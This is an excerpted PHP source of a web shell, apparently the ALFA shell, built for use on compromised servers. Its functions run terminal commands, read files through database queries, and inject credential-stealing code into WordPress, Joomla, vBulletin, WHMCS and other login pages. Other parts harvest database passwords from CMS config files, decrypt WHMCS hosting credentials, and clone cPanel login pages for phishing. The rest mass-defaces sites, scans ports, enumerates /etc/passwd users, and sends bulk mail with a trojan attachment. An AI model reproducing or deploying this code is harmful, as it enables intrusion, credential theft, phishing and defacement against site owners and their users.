case 'mysql':
...
if($host[1] === '' || $host[1] === '0') $host[1]=5432;
if( $this->link = @pg_connect(sprintf('host=%s port=%s user=%s password=%s dbname=%s', $host[0], $host[1], $user, $pass, $dbname)) ) return true;
break;
}
return false;
}
...
public function query($str): bool|\mysqli_result|\PgSql\Result{
switch($this->type){
case 'mysql':
...
$res = func_num_args() !== 0?func_get_arg(0):$this->res;
return match ($this->type) {
    'mysql' => @mysqli_fetch_assoc($res),
    'pgsql' => @pg_fetch_assoc($res),
    default => false,
};
}
...
{
    return match ($this->type) {
        'mysql' => @mysqli_error($this->link),
        'pgsql' => @pg_last_error(),
        default => false,
    };
}

public function setCharset($str): bool|int{
switch($this->type){
case 'mysql':
...
switch($this->type){
case 'mysql':
return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes((string) $str)."') as file"));
case 'pgsql':
$this->query("CREATE TABLE solevisible(file text);COPY solevisible FROM '".addslashes((string) $str)."';select file from solevisible;");
$r=[];
while($i=$this->fetch())
$r[] = $i['file'];
...
<td><input type='text' name='sql_host' id='db_host' value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars((string) $_POST['sql_host'])) ."'></td>
<td><input type='text' name='sql_login' id='db_user' value='". (empty($_POST['sql_login'])?'':htmlspecialchars((string) $_POST['sql_login'])) ."'></td>
<td><input type='text' name='sql_pass' id='db_pw' value='". (empty($_POST['sql_pass'])?'':htmlspecialchars((string) $_POST['sql_pass'])) ."'></td><td>";
$tmp = "<input type='text' name='sql_base' id='db_name' value='". (empty($_POST['sql_base'])?'':htmlspecialchars((string) $_POST['sql_base'])) ."'>";
if(isset($_POST['sql_host'])){
if($connection_db){
$db->setCharset('utf8');
$db->listDbs();
...
function alfaSql_manager_api(): ?false{
	$db = $_POST["alfa1"];
	$type = $_POST["alfa2"];
	$sql_count = $_POST["alfa3"] == "true";
	$db = @json_decode((string) $db, true);
	...
	if($conn){
		if($type == "load_all_tables"){
			...
			while($row = @mysqli_fetch_assoc($q_tables)){
				...
				$tables[$row["table_schema"]][] = ["name" => $row["table_name"], "count" => (int)$count];
			}
			...
			if($db["mode"] == "drop"){
				...
				echo @json_encode(["status" => true, "file" => $db["dump_file"]]);
			}
			...
			$db["alter"]["type"] = strtolower((string) $db["alter"]["type"]);
			$inputs = $db["alter"]["type"]."(".$db["alter"]["input"].")";
			$text_input = ["longtext", "text", "mediumtext", "tinytext"];
			if(in_array($db["alter"]["type"], $text_input, true)){
		...
		}elseif(in_array($type, ["edit", "delete", "delete_all"])){
			if($type == "edit"){
				$q = @mysqli_query($conn, "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` = '".addslashes((string) $db["key"])."' LIMIT 0,1");
				...
				if($row){
					...
					while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
						...
						$row2["type"] = strtolower((string) $row2["type"]);
						switch($row2["type"]){
					...
					foreach($row as $key => $v){
						$edit_data[] = ["col" => $key, "value" => htmlspecialchars($v, ENT_QUOTES, 'UTF-8'), "type" => $columns[$key]];
					}
					echo @json_encode($edit_data);
				}
			}else{
				$rows = $type == "delete_all" ? implode("', '", $db["rows"]) : addslashes((string) $db["key"]);
				$query = "DELETE FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` IN ('".$rows."')";
				@mysqli_query($conn, $query);
				$error = @mysqli_error($conn);
				$status = !(bool) $error;
				echo @json_encode(["status" => $status, "error" => $error, "query" => $query]);
			}
		}elseif($type == "update"){
			$query = "UPDATE `".$db["db"]."`.`".$db["table"]."` SET ";
			foreach($db["data"] as $col => $val){
				$query .= "`".$col."` = '".mysqli_real_escape_string($conn, (string) $val)."',";
			}
			$query = substr($query, 0, -1);
		    $query .= "WHERE `".$db["col_key"]."` = '".$db["key"]."'";
			$res = @mysqli_query($conn, $query);
			echo @json_encode(["status" => $res, "error" => @mysqli_error($conn)]);
		}elseif($type == "insert"){
			...
			if($type == "load_data"){
				...
				foreach($db["search"] as $col => $val){
					...
					if(strstr((string) $val["opt"], "...") || $search_noval_r){
						$val["opt"] = str_replace("...", $val["value"], $val["opt"]);
						$search .= $col . " " . $val["opt"] . " AND ";
					}else{
						$search .= $col . " " . $val["opt"] . " '".addslashes((string) $val["value"])."' AND ";
					}
				}
				$search .= "1=1";
			...
			$col_key = @mysqli_query($conn, "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '".@addslashes((string) $db["db"])."' AND TABLE_NAME = '".@addslashes((string) $db["table"])."' AND COLUMN_KEY = 'PRI'");
			if($col_key){
			...
			echo @json_encode(["status" => true, "table" => $tbl_content, "columns" => $columns, "pages" => $pages, "query" => $query]);
		}
		@mysqli_close($conn);
	}
    return null;
}
function alfaselfrm(): void{
...
echo "<div class=header>";
echo "
<center><p><img src=\"http://solevisible.org/images/farvahar-iran.png\"></p>";
echo '<p><div class="txtfont">Do you want to destroy me?!</div><a href=javascript:void(0) onclick="g(\'selfrm\',null,\'yes\');"> Yes</a>';
echo '</p></center></div>';
}
}
function alfacgishell(): void{
alfahead();
$div = "";
alfaCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
if(!in_array($_POST['alfa1'],['perl','py'])){
$div = "</div>";
...
if(isset($_POST['alfa1'])&&in_array($_POST['alfa1'],['perl','py'])){
@mkdir('cgialfa',0755);
@chdir('cgialfa');
alfacgihtaccess('cgi');
...
function decrypt($string,$cc_encryption_hash): string{
$key = md5 (md5 ((string) $cc_encryption_hash)) . md5 ((string) $cc_encryption_hash);
$hash_key = _hash($key);
$hash_length = strlen ($hash_key);
$string = __ZGVjb2Rlcg($string);
$tmp_iv = substr ((string) $string, 0, $hash_length);
$string = substr ((string) $string, $hash_length, strlen ((string) $string) - $hash_length);
$iv = '';
$out = '';
$c = 0;
while ($c < $hash_length)
...
function _hash($string): string
{
$hash = function_exists('sha1') ? sha1 ((string) $string) : md5 ((string) $string);
$out = '';
$c = 0;
while ($c < strlen ($hash))
{
...
$table = ['td1' =>
 ...
 ['color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],
 'td5' =>
 ['color' => 'FFFFFF', 'tdName' => 'cc_encryption_hash : ', 'inputName' => 'cc_encryption_hash', 'id' => 'cc_encryption_hash', 'inputValue' => '', 'inputSize' => '50']
];
create_table($table);
...
echo(sprintf('<tr><td><b><font color="#FFFFFF">Type</font></td><td>%s</td></tr></b>', $type));
echo(sprintf('<tr><td><b><font color="#FFFFFF">Active</font></td><td>%s</td></tr></b>', $active));
echo(sprintf('<tr><td><b><font color="#FFFFFF">Hostname</font></td><td>%s</td></tr></b>', $hostname));
echo(sprintf('<tr><td><b><font color="#FFFFFF">Ip</font></td><td>%s</td></tr></b>', $ipaddress));
echo(sprintf('<tr><td><b><font color="#FFFFFF">Username</font></td><td>%s</td></tr></b>', $username));
echo(sprintf('<tr><td><b><font color="#FFFFFF">Password</font></td><td>%s</td></tr></b>', $password));
...
echo("<center><table border='1'>");
echo(sprintf('<tr><td><b><font color="#67ABDF">Register</font></td><td>%s</td></tr></b>', $registrar));
echo(sprintf('<tr><td><b><font color="#67ABDF">Setting</font></td><td>%s</td></tr></b>', $setting));
echo(sprintf('<tr><td><b><font color="#67ABDF">Value</font></td><td>%s</td></tr></b>', $value));
echo "</table><br><br></center>";
}
}
...
$start = strip_tags((string) $_POST['alfa2']);
$end = strip_tags((string) $_POST['alfa3']);
$host = strip_tags((string) $_POST['alfa4']);
...
fclose($sock);
echo sprintf("<center><p>Port <font style='color:#DE3E3E'>%s</font> is open</p>", $i);
...
function alfacgihtaccess($m,$d='', $symname=false): void{
$readme = "";
if($symname){$readme="\nReadmeName ".trim((string) $symname);}
if($m=='cgi'){
...
$username = substr((string) $str,0,$pos);
$dirz = str_replace("{user}", $username, $makepwd);
if ($username != '' && @is_readable($dirz)) {
    $users[] = $username;
    $x++;
}}
}
echo '<br><br>';
echo '<b><font color="#00A220">[+] Founded '.count($passwd)." entrys in /etc/passwd\n"."<br /></font></b>";
...
echo sprintf("<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#27979B>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>%s</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='%s'><input type=submit value='>>'></form><br>", $user, $path);
}
...
$table = [
'td1' => ['color' => 'FFFFFF', 'tdName' => 'Mail To : ', 'inputName' => 'mail_to', 'inputValue' => 'target@fbi.gov', 'inputSize' => '60','placeholder' => true],
'td2' => ['color' => 'FFFFFF', 'tdName' => 'From : ', 'inputName' => 'mail_from', 'inputValue' => 'sec@google.com', 'inputSize' => '60', 'placeholder' => true],
'td3' => ['color' => 'FFFFFF', 'tdName' => 'Subject : ', 'inputName' => 'mail_subject', 'inputValue' => 'your site hacked by me', 'inputSize' => '60'],
'td4' => ['color' => 'FFFFFF', 'tdName' => 'Attach File : ', 'inputName' => 'mail_attach', 'inputValue' => $GLOBALS['cwd'].'trojan.exe', 'inputSize' => '60'],
'td5' => ['color' => 'FFFFFF', 'tdName' => 'Count Mail : ', 'inputName' => 'count_mail', 'inputValue' => '1', 'inputSize' => '60']
];
create_table($table);
...
$content = chunk_split((string) __ZW5jb2Rlcg($content));
$uid = md5(uniqid(time()));
...
if($count_mail === 0||$count_mail<1)$count_mail=1;
if(!empty($mail_from)){echo __pre();
for($i=1;$i<=$count_mail;$i++){
if(@mail((string) $mail_to,(string) $mail_subject,(string) $mail_content,$headers))echo(sprintf('<center>Sent -> %s<br></center>', $mail_to));
...
<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(empty($_POST['alfa3'])?htmlspecialchars((string) $GLOBALS['cwd']):htmlspecialchars((string) $_POST['alfa3'])).'" size="60"/>
...
alfaEx("powershell Compress-Archive -Path '".addslashes((string) $dirzip)."' -DestinationPath '".addslashes(basename((string) $zipfile))."'");
...
alfaEx("cd '".addslashes(dirname((string) $zipfile))."';zip -r '".addslashes(basename((string) $zipfile))."' '".addslashes((string) $dirzip)."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
...
<div class="txtfont">File: </div> <input type="text" name="dirzip" value="'.(empty($_POST['alfa3'])?htmlspecialchars((string) $GLOBALS['cwd']):htmlspecialchars((string) $_POST['alfa3'])).'" size="60"/>
...
if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
alfaEx("powershell expand-archive -path '".addslashes((string) $dirzip)."' -destinationpath '".addslashes(basename((string) $zipfile))."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_alfa_can_runCommand(true,true)&&((string) alfaEx('which unzip') !== ''||(string) alfaEx('which tar') !== ''||(string) alfaEx('which gunzip') !== '')){
switch ($file_type) {
	case 'application/zip':
		alfaEx("cd '".addslashes((string) $zipfile)."';unzip '".addslashes((string) $dirzip)."'");
	break;
	case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
		if(strstr(basename((string) $dirzip), ".tar.gz")||strstr(basename((string) $dirzip), ".tar")){
			alfaEx("cd '".addslashes((string) $zipfile)."';tar xzf '".addslashes((string) $dirzip)."'");
		}else{
			alfaEx("cd '".addslashes((string) $zipfile)."';gunzip '".addslashes((string) $dirzip)."'");
		}
	break;
}
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></b></p></center>';
	...
	switch ($file_type) {
		...
		break;
		case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
			if(strstr(basename((string) $dirzip), ".tar.gz")){
				$new_file = $zipfile .'/'. basename((string) $dirzip);
...
$cm_array = ["vb"=>"vBulletin","wp"=>"wordpress","jom"=>"joomla","whmcs"=>"whmcs","mybb"=>"mybb","ipb"=>"ipboard","phpbb"=>"phpbb"];
...
$saveto = $_POST['alfa2'];
$cmspath = $_POST['alfa4'];
if(!empty($cms) && !empty($saveto) && $_POST['alfa4'] && $_POST['alfa3'] == '>>'){
echo __pre();
...
function alfaHijackCms($cms,$cmspath,$saveto): void{
switch($cms){
case "vb":
...
function hijackvBulletin($path,$saveto): void{
...
$evil_login = "\t".$code."\n\t".$dologin;
$evil_class = "true";
if((@is_file($login) && @is_writable($login)) || (@is_file($class) && @is_writable($class))){
...
function hijackwp($path,$saveto): void{
...
if(@is_file($login) && @is_writable($login)){
$data_login = @file_get_contents($login);
...
function hijackJoomla($path,$saveto): void{
...
if(@is_file($login) && @is_writable($login) && $login != ''){
$data_login = @file_get_contents($login);
$evil_login = $code."\n".$data_login;
...
function hijackWhmcs($path,$saveto): void{
...
if(@is_file($conf) && @is_writable($conf)){
...
function hijackMybb($path,$saveto): void{
...
function hijackIPB($path,$saveto): void{
...
function hijackPHPBB($path,$saveto): void{
...
function hijackOutput($c=0,$p=''): void{echo($c==0?sprintf("<center><font color='green'>Success</font> --> path: %s</center>", $p):'<center><font color="red">Error in inject code !</font></center>');}
function Alfa_StrSearcher($dir,$string,$ext,$e,$arr=[]): void{
if(@is_dir($dir)){
$files=@scandir($dir);
...
if(str_contains($content, (string) $string)){
echo str_replace('\\','/',$path) . "<br>";
}
}else{
if(strstr($value,(string) $string)){
echo str_replace('\\','/',$path) . "<br>";
}
}
$results[] = $path;
...
function alfafakepage(): void{
	...
	if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['alfa3'] == '>>'){
		...
		if(!empty($source_page)){
			$matched_form = "";
			if($panel == "cpanel"){
				if(preg_match('#<form(.*)id="login_form"(.*)>#', (string) $source_page, $match)){
					$matched_form = $match[0];
				}
			}else{
				if(preg_match('#<form(.*?)>#', (string) $source_page, $match)){
					$matched_form = $match[0];
				}
			}
			if($matched_form !== '' && $matched_form !== '0'){
				$fake = "";
				...
				$cookie_name = "alfa_fakepage_counter" . random_int(9999,99999);
				...
				if($panel == "cpanel"){
					$fake = preg_replace(['#<link(.*)href="(.*)"(.*)>#', '#<img class="main-logo" src="(.*)"(.*)>#', '# <a(.*)id="reset_password">#'], ['<link href="'.$target.'/$2">', '<img class="main-logo" src="'.$target.'/$1" alt="logo" />', '<a href="#" id="reset_password">'], $fake);
				}
...
function alfaarchive_manager(): void{
	alfahead();
	$file = $_POST['alfa2'];
	if(!file_exists($file)){
		$file = $GLOBALS['cwd'];
	}
	$rand_id = random_int(9999, 999999);
	...
	if($_POST['alfa5']=='>>'){
		//echo __pre();
		echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$file.'" archive_name="'.basename((string) $file).'" id="archive_dir_'.$rand_id.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
...
function __alfa_open_archive_file($arch, $base_id=0): void{
	try{
		$files = [];
		$dirs = [];
		$archive = new PharData($arch);
		 foreach($archive as $file) {
		     ...
		     if($file->isDir()) {
				 $dirs[] = ["name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "dir", "modify" => $file_modify];
		     }else{
				 $file_size = @filesize($file->getPathname());
				 $files[] = ["name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "file",  "modify" => $file_modify, "size" => $file_size];
			 }
		 }
		 function __alfa_open_archive_usort(array $a, array $b): int{
...
function alfaopen_archive_dir(): void{
	$dir = $_POST["alfa1"];
	$base_id = $_POST["alfa2"];
	__alfa_open_archive_file($dir, $base_id);
}
function alfaconfig_grabber(): void{
	alfahead();
...
function Alfa_ConfigGrabber($dir, $ext): void {
	...
	if(@is_readable($dir)){
		$globFiles = @glob(sprintf('%s/*.%s', $dir, $ext));
		...
		foreach ($globFiles as $file){
			...
			if(preg_match($pattern, $filee)){
				echo sprintf("<div><span>%s</span> <a style='cursor:pointer;' onclick=\"editor('", $file).$file."','auto','','','','file');\">[ View file ]</a></div>";
			}
		}
	}
}
function alfasearcher(): void{
alfahead();
...
if($_POST['alfa5']=='>>'){
echo __pre();
if(str_ends_with((string) $dir, '/'))$dir=substr((string) $dir,0,-1);
Alfa_Searcher($dir,trim((string) $ext),$method);
}
}
if($_POST['alfa1']=='str'){
...
$string = $_POST['alfa3'];
$ext = $_POST['alfa5'];
if(!empty($string) && !empty($dir) && $_POST['alfa4'] == '>>'){
echo __pre();
...
echo '<div class="txtfont">Deface Method: <select name="method"><option value="index">Deface Index Dirs</option><option value="all">All Files</option></select>
	Mass dir: <input size="50" id="target" type="text" name="massdir" value="'.htmlspecialchars((string) $GLOBALS['cwd']).'">
	DefPage: <input size="50" type="text" name="defpage" value="'.htmlspecialchars((string) $GLOBALS['cwd']).'"></div> <input type="submit" name="btn" value=" "></center></p>
</form>';
$dir = $_POST['alfa1'];
$defpage = $_POST['alfa2'];
$method = $_POST['alfa3'];
...
function Alfa_ReadDir($dir,$method='',$defpage=''): ?false{
...
function Alfa_Rewriter($dir,$file,$defpage,$m='index'): ?false{
...
if(in_array(strtolower((string) $file),$indexs, true)){
...
function Alfa_Create_A_Tag($action,$vals): void{
$nulls = [];
...
function Alfa_Searcher($dir, $ext, $method): void {
if(@is_readable($dir)){
if($method == 'all')$ext = '*';
if($method == 'dirs')$ext = '*';
$globFiles = @glob(sprintf('%s/*.%s', $dir, $ext));
...
case "dirs":
foreach ($globFiles as $file){
if(@is_writable(dirname($file)) && !in_array(dirname($file), $blacklist, true)){
...
function AlfaiFrameCreator($f,$width='100%',$height='600px'): string{
...
/**
 * @var 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36)'
 */
public $user_agent;
...
public function __construct(public $cookies=false,public $compression='gzip',public $proxy=''){
if(!extension_loaded('curl')){$curl_status = false;return;}
...
public function cookie($cookie_file): void {
if (_alfa_file_exists($cookie_file,false)) {
$this->cookie_file=$cookie_file;
}else{
@fopen($cookie_file,'w') || die($this->error('The cookie file could not be opened.'));
$this->cookie_file=$cookie_file;
@fclose($this->cookie_file);
}
}

public function Send($url,$method="get",$data=""): bool|string{
...
echo sprintf("<center><div style='width:500px;border: 3px solid #FFEEFF; padding: 3px; background-color: #FFDDFF;font-family: verdana; font-size: 10px'><b>cURL Error</b><br>%s</div></center>", $error);
die;
}
}
function getConfigHtml($cms): string{
$content = '';
$cms_array = ["wp" => "WordPress", "vb" => "vBulletin", "whmcs" => "Whmcs", "joomla" => "Joomla", "phpnuke" => "PHPNuke","phpbb"=>"PHPBB","mybb"=>"MyBB","drupal"=>"Drupal","smf"=>"SMF"];
...
$content .= sprintf("<option value='%s' ", $key).($key==$cms?'selected=selected':'').sprintf('>%s</option>', $val);
}
...
function alfaterminalExec(): void{
	$pwd = "pwd";
	$seperator = ";";
	if($GLOBALS['sys']!='unix'){
		$pwd = "cd";
	...
	if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes((string) $_POST["c"])."'".$seperator;}
	$current_path = '';
	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", (string) $_POST['alfa1'], $match)){
		if(empty($match[1])){
			$match[1] = $match[2];
		}
	...
	$out = htmlspecialchars((string) $out);
	echo json_encode(["output" => convertBash($out), "path" => $current_path]);
}
function convertBash($code): string|array {
    $dictionary = [
    ...
    return str_replace(array_keys($dictionary), $dictionary, $code);
}
function alfadoActions(): void{
	$chdir_fals = false;
	if(!@chdir($_POST['c'])){
		$chdir_fals = true;
		$alfa_canruncmd = _alfa_can_runCommand(true,true);
	...
	if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode((string) $_POST['alfa1']);
	if(isset($_POST['alfa2']))$_POST['alfa2'] = rawurldecode((string) $_POST['alfa2']);
	$action = $_POST["alfa3"];
	if($action == "permission"){
		$perms = 0;
		$perm = $_POST["alfa2"];
		for($i=strlen((string) $perm)-1;$i>=0;--$i){
			$perms += (int)$perm[$i]*8 ** (strlen((string) $perm) - $i - 1);
		}
		if(@chmod($_POST['alfa1'], $perms)){
			echo("done");
		}else{
	...
	if($action == "rename" || $action == "move"){
		...
		if($_POST["alfa3"] == "rename"){
			$_POST['alfa2'] = basename((string) $_POST['alfa2']);
		}
		if(!empty($_POST['alfa2'])){
			$cmd_rename = false;
			if ($chdir_fals && $alfa_canruncmd && _alfa_is_writable($_POST['alfa1'])) {
                $cmd_rename = true;
                $alfa1_escape = addslashes((string) $alfa1_decoded);
                alfaEx("cd '".addslashes((string) $_POST['c'])."';mv '".$alfa1_escape."' '".addslashes((string) $_POST['alfa2'])."'");
            }
		...
		if(is_dir($_POST["alfa1"])){
			...
			$dir = explode('/', $dir);
			$name = empty($dir[count($dir) - 1]) ? $dir[count($dir) - 2] : $dir[count($dir) - 1];
		}else{
			$name = basename((string) $_POST["alfa1"]);
		}
		$dir = dirname((string) $_POST["alfa1"]);
		if($dir === "."){
			$dir = $_POST["c"]."/";
		}
		...
		if( !empty($_POST['alfa1']) ) {
			$time = strtotime((string) $_POST['alfa1']);
			if($time){
				$touched = false;
				if($chdir_fals&&$alfa_canruncmd){
					alfaEx("cd '".addslashes((string) $_POST["c"])."';touch -d '".htmlspecialchars(addslashes((string) $_POST['alfa1']))."' '".addslashes((string) $_POST['alfa2'])."'");
					$touched = true;
				}
...
function alfaget_flags(): void{
	$flags = [];
	if(function_exists("curl_version")){
		$curl = new AlfaCURL();
		$server_addr = (@$_SERVER["SERVER_ADDR"] ?: (function_exists("gethostbyname") ? @gethostbyname($_SERVER['SERVER_NAME']) : '????'));
		...
		if(str_contains((string) $flag2, "geoplugin")){
			$flag = json_decode((string) $flag, true);
			$flag2 = json_decode((string) $flag2, true);
...
function alfaGetConfig(): ?false{
$cms = $_POST['alfa1'];
$path = trim((string) $_POST['alfa2']);
$config = [
'wp'=>['file'=>'/wp-config.php',
...
'drupal2'=>['file'=>'/sites/default/settings.php',
'host'=>["/(?:'|\")host(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1],
...
if($cms == "drupal2"){
	$file = preg_replace("/\@code(.*?)\@endcode/s", "", (string) $file);
}elseif($cms == "vb"){
	$file = preg_replace("/right of the(.*?)BAD!/s", "", (string) $file);
}
if(preg_match($srch_host, (string) $file, $mach)){
$data['host'] = $mach[$chost];
}
if(preg_match($srch_user, (string) $file, $mach)){
$data['user'] = $mach[$cuser];
}
if(preg_match($srch_name, (string) $file, $mach)){
$data['dbname'] = $mach[$cname];
}
if(preg_match($srch_pw, (string) $file, $mach)){
$data['password'] = $mach[$cpw];
}
if(preg_match($prefix, (string) $file, $mach)){
$data['prefix'] = $mach[$cprefix];
}
if($cms == 'whmcs' && preg_match($config[$cms]['cc_encryption_hash'][0], (string) $file, $mach)){
...
if(empty($_POST['a']))
$_POST['a'] = function_exists('alfa' . $default_action) ? $default_action : 'FilesMan2';//'FilesMan';
